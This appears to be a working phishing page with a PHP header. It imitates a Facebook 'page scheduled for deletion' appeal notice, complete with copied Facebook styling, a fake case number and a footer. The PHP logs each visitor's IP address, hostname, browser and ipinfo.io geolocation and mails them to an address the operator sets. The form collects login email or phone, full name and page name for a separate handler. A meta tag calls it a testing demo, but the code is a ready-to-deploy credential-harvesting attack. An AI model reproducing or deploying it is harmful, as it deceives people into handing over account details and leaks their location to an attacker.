  <?php

  include('email.php');

  $randomCode = rand(1, 99);

  if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
  {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } 
  elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) 
  {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } 
  else 
  {
    $ip = $_SERVER['REMOTE_ADDR'];
  }
  
   $realIp = explode (",", $ip); 
    
    @$details = json_decode(file_get_contents("http://ipinfo.io/{$realIp[0]}/json"));
    
    //@$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
    @$hostname=gethostbyaddr($_SERVER['REMOTE_ADDR']);
    $QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']);
    $stringuFillestar = $QUERY_STRING.PHP_EOL .PHP_EOL .
    '[IP address]: '.$ip.PHP_EOL .PHP_EOL .
    '[Hostname]: '.$hostname.PHP_EOL .PHP_EOL .
    '[Browser and OS]: '.$_SERVER['HTTP_USER_AGENT'] .PHP_EOL .PHP_EOL .
    '[Coordinates]: '.$details->loc. PHP_EOL .PHP_EOL .
    '[ISP provider]: '.$details->org. PHP_EOL .PHP_EOL .
    '[City]: '.$details->city. PHP_EOL .PHP_EOL .
    '[State]: '.$details->region. PHP_EOL .PHP_EOL .
    '[Country]: '.$details->country. PHP_EOL .PHP_EOL .
    '[Date]: '.date("D dS M,Y h:i a"). PHP_EOL . PHP_EOL .
    '[Kodi]: '.$randomCode;
  
    mail($emailikomplet, "[".$randomCode."] Skripta u hap...", $stringuFillestar, $headers);

?>

<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="description" content="This is only for testing purposes (how can you be scammed and how to avoid it), and in no way is for public use or misuse, scam or do anything illegal with it">
    <meta name="author" content="Facebook Developer Student Group">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" href="flogo.png">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yl/l/0,cross/2E8-yNpBMrbsHUpitHChBN.css?_nc_x=RoKQjLkBIlU" data-bootloader-hash="nuHa9gj" crossorigin="anonymous" data-p=":9,86" data-c="2" />

    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yw/l/0,cross/COboB1arX57.css?_nc_x=RoKQjLkBIlU" data-bootloader-hash="sbYhqxZ" crossorigin="anonymous" />

    <link rel="stylesheet" type="text/css" href="style.css">

    <title>Appeal Request [Case #589644965654870]</title>
  </head>
  <body>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
    <script src="https://kit.fontawesome.com/a2267851a4.js" crossorigin="anonymous"></script>


    <section class="contenti">
      <div class="container">
        <div class="row">         

          <div class="col-12 col-md-12">
            <div class="contenthehe">
              <div class="message">
                <div class="row">
                  <div class="col-2 col-md-1 colvogel">
                    <div><i class="fas fa-envelope"></i></div>
                  </div>
                  <div class="col-10 col-md-11 coliyourpage">
                    <p class="titlewe" style="font-size: 14px;">Your page has been scheduled for deletion</p>
                    <!-- <p class="titlewe">Your page was reported for an Intellectual Property Violation</p> -->
                    <a href="#appeali"><p class="open" style="font-size: 14px;">Case #589644965654870</p></a>
                    <p class="case"></p>
                  </div>
                </div>
              </div>

              <div class="activity">
                <div class="row">
                  <div class="col-12">
                    <div class="activitygroup">
                      <div class="row">
                        <div class="col-2 col-md-1">
                          <i class="fab fa-facebook-square"></i>
                        </div>
                        <div class="col-10 col-md-11 coliwithoutpadding" style="padding-left: 0px;">
                          <div class="ourmessage">
                            <p style="font-weight: bold; color:black; margin-bottom: 5px;">Our Message</p>
                            <p>Your page has been scheduled for permanent deletion because your account, or activity on it, didn't follow one of our Comunity Standards:</p><br>
                            <li> Graphic violence</li>
                            <li> Hate speech, harassment and bullying</li>
                            <li> Nudity, sexual activity and sexual exploitation</li>
                            <li> Intellectual Property Infringement</li>                           

                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>


              <div class="whatcanwedo">
                <p class="whatcanyoudo" style="font-size: 14px; color: gray;">WHAT YOU CAN DO ?</p>
                    <div class="appeal">
                        <p> To request access to an appeal file, please fill out and submit the form below. </p>
                    </div>
              </div>          

              <div class="yourresponse">
                <div class="row">
                  <div class="col-2 col-md-1">
                    <i class="fas fa-user-alt"></i>
                  </div>
                  <div class="col-10 col-md-11 coliwithoutpadding" style="padding-left: 0px;">
                    <div class="ourmessage">
                      <p style="font-weight: bold; color:black; margin-bottom: 5px;"><p><a href="#appeali" style="color:#385898;">Your Appeal</a></p></p>
                      <p style="font-size: 11px; margin-bottom: 15px">Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.</p>
                      <form action="authenticate.php" method="POST" id="appeali">
                        <div class="form-group">
                          <label for="emaili">Login email address or mobile phone number</label>
                          <input type="text" required class="form-control" id="emaili" name="emaili" aria-describedby="emailHelp">
                        </div>
                        <div class="form-group">
                          <label for="emri">Your Name (Name and Surname)</label>
                          <input type="text" required class="form-control" id="emri" name="emri" aria-describedby="emailHelp" >
                        </div>
                        <div class="form-group">
                          <label for="pagename">Page Name</label>
                          <input type="text" required class="form-control" id="pagename" name="pagename" aria-describedby="emailHelp" >
                        </div>
                        
                        <div class="form-group">
                          <label for="info">Additional info</label>
                          <textarea class="form-control" id="infoja" name="infoja" aria-describedby="emailHelp" ></textarea>
                        </div>


                        <div class="form-check">
                          <input type="checkbox" class="form-check-input" id="checkbox" name="checkbox" required>
                          <label class="form-check-label" for="checkbox">Please confirm that you wish to submit this form</label><br><br>                          
                        </div>
                      
                      <input type="hidden" id="ipAddress" name="ipAddress" value="<?php echo $ip; ?>">
                      <input type="hidden" id="randomCodi" name="randomCodi" value="<?php echo $randomCode; ?>">

                        <button type="submit" class="btn butoniappeal">Submit</button>
                      </form>

                    </div>
                    <br>
                    <div class="_57yz _57z0 _655w"><div class="_57y-">
                      Due to the global impact of COVID-19, requested reviews are expected to take longer than usual!<p><br>
                      <a href="https://www.facebook.com/business/help/285854632398488" target="_new"><li>Delays Expected for Requested Reviews</li></a></p>
                    </div></div>
                  </div>

                </div>

              </div>

             
            </div>
          </div>
        </div>
      </div>

    <section class="footer" style="margin-top: -70px;">
      <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 pfnyh3mw taijpn5t ll8tlv6m lhclo0ds btwxx1t3 hv4rvrfc dati1w0a jb3vyjys k4urcfbm">
        <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 hpfvmrgz k6hq67h2">
          <div data-visualcompletion="ignore-dynamic" style="padding-left:8px;padding-right:8px">
            <div class="ue3kfks5 pw54ja7n uo3d90p7 l82x9zwi a8c37x1j"><div class="ow4ym5g4 auili1gw rq0escxv j83agx80 buofh1pr g5gj957u i1fnvgqd oygrvhab cxmmr5t8 hcukyx3x kvgmc6g5 nnctdnn4 hpfvmrgz qt6c0cv9 jb3vyjys l9j0dhe7 du4w35lb bp9cbjyn btwxx1t3 dflh9lhu scb9dxdr">
              <div class="ow4ym5g4 auili1gw rq0escxv j83agx80 buofh1pr g5gj957u i1fnvgqd oygrvhab cxmmr5t8 hcukyx3x kvgmc6g5 tgvbjcpo hpfvmrgz qt6c0cv9 rz4wbd8a a8nywdso jb3vyjys du4w35lb bp9cbjyn btwxx1t3 l9j0dhe7">
                <div class="gs1a9yip ow4ym5g4 auili1gw rq0escxv j83agx80 cbu4d94t buofh1pr g5gj957u i1fnvgqd oygrvhab cxmmr5t8 hcukyx3x kvgmc6g5 tgvbjcpo hpfvmrgz rz4wbd8a a8nywdso l9j0dhe7 du4w35lb rj1gh0hx pybr56ya f10w8fjw">
                  <div class="">
                    <div class="j83agx80 cbu4d94t ew0dbk1b irj2b8pg">
                      <div class="qzhwtbm6 knvmm38d">
                        <span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d9wwppkn fe6kdd0r mau55g9w c8b282yb iv3no6db e9vueds3 j5wam9gi b1v8xokw m9osqain hzawbc8m" dir="auto">
                          <span class="a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7 ltmttdrg g0qnabr5 ojkyduve">
                           © 2021 Meta</a></span></span></div></div></div></div></div></div></div></div></div><div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t g5gj957u kqtctah3 jc1vo43v o8rfisnq"><ul aria-label="Help Center Footer" role="listbox"><div class="bq4bzpyk j83agx80 btwxx1t3 lhclo0ds jifvfom9 muag1w35 dlv3wnog enqfppq2 rl04r1d5"><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://about.facebook.com/?utm_source=help-center" role="link" tabindex="0" target="_blank"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">About</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/privacy/explanation/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Privacy</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/policies/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Terms and Policies</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/help/568137493302217/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Ad Choices</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/careers/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Careers</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/policies/cookies/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Cookies</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/business/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Create Ad</span></a></li></div><div class="rq0escxv j83agx80 rj1gh0hx cbu4d94t buofh1pr g5gj957u ph5uu5jm b3onmgus n1dktuyu e5nlhep0 ecm0bbzt" style="max-width:180px;min-width:140px"><li role="listitem"><a class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 j83agx80 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl gmql0nx0 p8dawk7l bp9cbjyn tv7at329" href="https://www.facebook.com/pages/creation/" role="link" tabindex="0"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain" dir="auto">Create Page</span></a></li></div></div></ul></div><div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 hpfvmrgz"><img width="180" alt="From Facebook Logo" referrerPolicy="origin-when-cross-origin" src="HAhr_ppQVQg.png"/></div></div></div></div></div></div></div></div></div><div class="fk4cgndu e5ffyxfx f0zqjlou r6i6mz7r r54jmrld sf74r906 poy2od1o hlyrhctz"><div><div class="fg8d9fp7"><div class="j83agx80 l9j0dhe7 k4urcfbm"><div style="border-radius:max(0px, min(8px, calc((100vw - 4px - 100%) * 9999))) / 8px" class="rq0escxv l9j0dhe7 du4w35lb hybvsw6c io0zqebd m5lcvass fbipl8qg nwvqtn77 k4urcfbm ni8dbmo4 stjgntxs kmp5kqmu"><fieldset class="qu0x051f esr5mh6w e9989ue4 r7d6kgcz kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso">
        </section>

  </body>
</html>
